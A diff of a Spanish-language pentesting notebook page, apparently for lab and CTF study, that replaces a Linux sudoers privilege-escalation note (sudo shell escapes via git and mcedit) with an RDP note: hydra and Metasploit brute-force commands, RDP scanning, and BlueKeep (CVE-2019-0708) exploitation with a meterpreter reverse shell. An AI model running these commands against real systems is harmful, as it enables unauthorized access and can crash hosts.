@@ -4,7 +4,7 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
-    <title>Sudoers | Notebook</title>
+    <title>3389 - RDP | Notebook</title>
     <link rel="stylesheet" href="/section.css" />
   </head>
   <body>
@@ -47,7 +47,7 @@
               <a class="vault-file" href="/notebook/enumeracion-puertos/2049-nfs.html">2049 - NFS</a>
               <a class="vault-file" href="/notebook/enumeracion-puertos/3128-squid-proxy.html">3128 - Squid Proxy</a>
               <a class="vault-file" href="/notebook/enumeracion-puertos/3306-mysql.html">3306 - MySQL</a>
-              <a class="vault-file" href="/notebook/enumeracion-puertos/3389-rdp.html">3389 - RDP</a>
+              <a class="vault-file is-active" href="/notebook/enumeracion-puertos/3389-rdp.html">3389 - RDP</a>
               <a class="vault-file" href="/notebook/enumeracion-puertos/5432-5437-postgresql.html">5432,5437 - PostgreSQL</a>
               <a class="vault-file" href="/notebook/enumeracion-puertos/5985-5986-winrm.html">5985,5986 - WinRM</a>
             </details>
@@ -55,7 +55,7 @@
               <summary>Escalada de Privilegios</summary>
               <details class="vault-folder vault-subfolder" open>
                 <summary>Linux</summary>
-                <a class="vault-file is-active" href="/notebook/escalada-privilegios/linux/sudoers.html">Sudoers</a>
+                <a class="vault-file" href="/notebook/escalada-privilegios/linux/sudoers.html">Sudoers</a>
                 <a class="vault-file" href="/notebook/escalada-privilegios/linux/suid.html">SUID</a>
                 <a class="vault-file" href="/notebook/escalada-privilegios/linux/grupos-vulnerables.html">Grupos Vulnerables</a>
               </details>
@@ -66,9 +66,9 @@
           </nav>
         </aside>
 
-        <article class="note-panel is-active" id="sudoers">
+        <article class="note-panel is-active" id="3389-rdp">
           <div class="note-tabbar">
-            <span>Sudoers</span>
+            <span>3389 - RDP</span>
             <details class="notebook-tag-search">
               <summary>Buscar tags</summary>
               <label>
@@ -77,64 +77,85 @@
               </label>
               <div class="notebook-search-results" aria-live="polite"></div>
             </details>
-            <span>~/notebook/Escalada de Privilegios/Linux</span>
+            <span>~/notebook/Enumeración de Puertos</span>
           </div>
 
           <div class="note-content">
-            <p class="eyebrow">escalada de privilegios / linux / sudoers</p>
-            <h2>Sudoers</h2>
-
-            <p><code>/etc/sudoers</code> es el archivo de configuración que define quién puede usar <code>sudo</code> y qué comandos puede ejecutar como otro usuario, normalmente <code>root</code>.</p>
+            <p class="eyebrow">enumeración de puertos / rdp</p>
+            <h2>3389 - RDP</h2>
 
             <section class="code-card">
-              <h3>Listar comandos que podemos ejecutar como otro usuario</h3>
-              <pre><code>sudo -l
+              <h3>xfreerdp acceso remoto</h3>
+              <pre><code>xfreerdp /v:&lt;ip_victima&gt;:&lt;port&gt; /u:&lt;usuario&gt; /p:&lt;contraseña&gt;
 
-# Output
-student ALL=(root) NOPASSWD: /usr/bin/man</code></pre>
+# Antiguo
+rdesktop -u &lt;usuario&gt; -p &lt;contraseña&gt; &lt;ip_victima&gt;</code></pre>
             </section>
 
-            <p><a href="https://gtfobins.github.io/#+sudo">GTFOBins SUDO</a></p>
-
             <section class="code-card">
-              <h3>Ejecutar binarios permitidos como otro usuario</h3>
-              <pre><code># Para usuario pepe
-sudo -u pepe git -p help config
+              <h3>Fuerza Bruta: hydra</h3>
+              <pre><code>#Simple
+hydra -L &lt;wordlists_usenames.txt&gt; -p &#x27;password123&#x27; &lt;ip_victima&gt; rdp
 
-# Para root
-sudo git -p help config</code></pre>
+hydra  -L &lt;wordlists_usenames.txt&gt; -P &lt;wordlists_password.txt&gt; rdp://&lt;ip_victima&gt; -s &lt;port&gt;
+
+# Complejo. Recomienda usar -t para bajar la velocidad y evitar bloqueos
+hydra -t 4 -V -f -L &lt;wordlists_usenames.txt&gt; -P &lt;wordlists_password.txt&gt; rdp://&lt;ip_victima&gt;</code></pre>
             </section>
 
-            <h2>Binarios No Contemplados en GTFOBins</h2>
+            <section class="code-card">
+              <h3>Fuerza Bruta: metasploit</h3>
+              <pre><code>use auxiliary/scanner/rdp/rdp_login
+set RHOSTS &lt;ip_victima&gt;
+set USER_FILE /ruta_diccionario_usuarios.txt
+set PASS_FILE /ruta_diccionario_claves.txt
+set THREADS 10
+exploit</code></pre>
+            </section>
 
             <section class="code-card">
-              <h3>mcedit</h3>
-              <pre><code>sudo mcedit
+              <h3>Comprobar si el puerto es un RDP</h3>
+              <pre><code>msfconsole -q
+use auxiliary/scanner/rdp/rdp_scanner 
+set RHOSTS &lt;ip_victima&gt;
+set RPORT &lt;port_test&gt;
+run</code></pre>
+            </section>
 
-# Comandos
-F+9
+            <h3>BlueKeep (CVE-2019-0708)</h3>
 
-# Ruta
-File -&gt; User menu -&gt; Invoke 'shell'</code></pre>
+            <ul>
+              <li>Versiones de Windows vulnerables: XP, Vista, Windows 7, Windows Server 2008 &amp; R2</li>
+              <li>Metasploit tiene un módulo auxiliar para comprobar si es vulnerable, y otro para explotarlo</li>
+            </ul>
+
+            <aside class="callout">
+              <p>❗ Apunta al espacio de la memoria del Kernel y en Aplicaciones puede romper el sistema</p>
+            </aside>
+
+            <section class="code-card">
+              <h3>Comprobar si es vulnerable</h3>
+              <pre><code>use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
+set RHOST &lt;ip_target&gt;
+run</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Explotación BlueKeep</h3>
+              <pre><code>use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+set RHOST &lt;ip_target&gt;
+run
+# Usar payload de meterpreter (windows/x64/meterpreter/reverse_tcp)
+# Usar target adecuado</code></pre>
             </section>
 
             <h2>Tags</h2>
             <div class="tag-list">
-              <span>escalada_privilegios</span>
-              <span>sudoers</span>
-              <span>sudo</span>
-              <span>linux</span>
-              <span>gtfobins</span>
-              <span>privesc</span>
-              <span>misconfigurations</span>
-              <span>mcedit</span>
-            </div>
-
-            <h2>Máquinas Relacionadas</h2>
-            <div class="tag-list">
-              <span>Bashed</span>
-              <span>Nibbles</span>
-              <span>dog</span>
+              <span>Simple</span>
+              <span>ports</span>
+              <span>rdp</span>
+              <span>bluekeep</span>
+              <span>p3389</span>
             </div>
           </div>
         </article>
